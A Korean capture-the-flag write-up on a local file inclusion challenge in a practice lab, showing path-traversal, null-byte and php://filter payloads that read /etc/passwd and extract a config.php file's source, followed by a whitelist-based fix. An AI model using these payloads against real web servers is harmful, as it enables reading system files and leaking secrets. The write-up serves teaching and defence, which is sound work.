+++
title = "VulnABLE CTF [LUXORA] Write-up: LFI 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "LFI", "Silver", "PHP Wrappers", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: LFI 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: File & Resource Layer (LFI)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/lfi/silver`
- **목표**: 서버가 사용자가 입력한 파일명 뒤에 강제로 특정 확장자(`.txt` 등)를 붙여서 필터링하는 환경에서, 이를 우회하고 원하는 파일의 소스코드를 추출하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 방어 로직 분석 (Reconnaissance)

`/lfi/silver` 페이지 역시 `file` 파라미터를 통해 페이지 내용을 불러옵니다.

**[정상 요청]**
```http
GET /lfi/silver?file=about HTTP/1.1
```

**[해커의 사고 과정]**
1. 파라미터 값에 `about.txt`나 `about.php` 같은 확장자가 없다. 그저 `about` 이라고만 보낸다.
2. 이는 백엔드에서 내가 보낸 문자열 뒤에 확장자를 강제로 붙이고 있다는 뜻이다.
   - 예: `include("templates/" + req.query.file + ".php")`
3. Bronze에서 했던 방식(`../../../../etc/passwd`)을 넣으면, 서버는 `/etc/passwd.php` 를 찾으려 할 것이고, 그런 파일은 없으므로 에러가 날 것이다.
4. 강제로 붙는 꼬리표(`.php`)를 떼어내거나, 파일 내용을 통째로 인코딩해서 빼내오는(Wrapper) 기법이 필요하다!

---

## 💥 2. 취약점 식별 및 우회 전략 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(file=../../../../etc/passwd)--> [ Web Server ]
                                                |-- include(../../../../etc/passwd)
<-- Contents of /etc/passwd --------------------|
```


### 💡 전략 1: 널 바이트 인젝션 (Null Byte Injection)
C 언어 기반의 파일 시스템 API(PHP 구버전 등)는 문자열의 끝을 `\0` (Null)로 인식합니다.
URL 인코딩으로는 `%00` 입니다.
* 페이로드: `../../../../etc/passwd%00`
* 서버 해석: `include("../../../../etc/passwd\0.php")` ➔ `\0` 뒤의 문자가 잘려나가 `/etc/passwd` 만 실행됨!
*(단, 이 방법은 최신 PHP 5.3.4 이상이나 Node.js 최신 버전에서는 패치되어 작동하지 않을 수 있습니다.)*

### 💡 전략 2: PHP 래퍼(Wrappers) 활용 (가장 확실한 방법)
LFI가 PHP 환경에서 터졌다면, `php://filter` 라는 마법의 래퍼를 사용할 수 있습니다. 파일의 내용을 브라우저에 바로 띄우지 않고 Base64로 인코딩해서 가져오라고 지시합니다.

* 기본 구조: `php://filter/convert.base64-encode/resource=[타겟 파일]`
* 이 방법을 쓰면, 코드가 실행되어버리는 파일(`config.php` 등)도 소스코드 형태 그대로 추출할 수 있습니다.

---

## 🚀 3. 공격 수행 및 소스코드 추출

여기서는 PHP 필터 래퍼를 사용하여, 서버의 중요 설정 파일인 `config.php` 의 소스코드를 추출해 보겠습니다. (서버가 뒤에 `.php`를 붙여주므로 파일명에는 `config`만 적습니다.)

**[조작된 페이로드]**
```http
GET /lfi/silver?file=php://filter/convert.base64-encode/resource=config HTTP/1.1
Host: localhost:3000
```

### 🔍 서버의 응답
서버는 `config.php` 파일을 실행하는 대신, 내용을 통째로 Base64로 바꿔서 화면에 출력합니다.

```text
<div class="content">
  PD9waHAKLy8gU2VjcmV0IGNvbmZpZ3VyYXRpb24KJGZsYWcgPSAiRkxBR3tMRklf8J+kr19QSFBfV1JBUFBFUl9ENEU1RjZ9IjsKPz4=
</div>
```

### 디코딩 및 플래그 확인
얻어낸 Base64 문자열을 디코딩합니다.
```bash
$ echo "PD9waHAKLy8gU2VjcmV0IGNvbmZpZ3VyYXRpb24KJGZsYWcgPSAiRkxBR3tMRklf8J+kr19QSFBfV1JBUFBFUl9ENEU1RjZ9IjsKPz4=" | base64 -d
```
```php
<?php
// Secret configuration
$flag = "FLAG{LFI_🥈_PHP_WRAPPER_D4E5F6}";
?>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

파일의 확장자를 서버에서 강제로 고정하더라도, 프로그래밍 언어(PHP)가 제공하는 고유의 파일 스트림 필터(Wrapper)를 악용하면 서버 내의 모든 소스코드를 평문으로 유출할 수 있음을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{LFI_🥈_PHP_WRAPPER_D4E5F6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
사용자 입력을 `include()` 나 `require()` 의 인자로 넘기는 것 자체가 가장 큰 보안 구멍입니다.

* **안전한 패치 가이드 (직접 참조 금지 및 매핑 구조 사용)**
사용자 입력이 파일 시스템 경로에 직접 닿지 않게 해야 합니다. 가장 좋은 방법은 데이터베이스나 배열(Map)을 이용해 사용자의 입력 키(Key)와 실제 파일 경로를 매핑하는 것입니다.

```php
// 안전한 PHP 예시 (간접 참조)
$pages = [
    "welcome" => "templates/welcome.html",
    "about"   => "templates/about.html"
];

$requested_page = $_GET['file'];

// 사용자가 입력한 값이 우리가 정의한 배열의 Key로 존재하는지 확인
if (array_key_exists($requested_page, $pages)) {
    include($pages[$requested_page]);
} else {
    echo "404 Not Found";
}
```
이렇게 조치하면 해커가 `php://filter...` 나 `../../../etc/passwd` 를 입력하더라도, 배열에 없는 키이므로 안전하게 차단됩니다.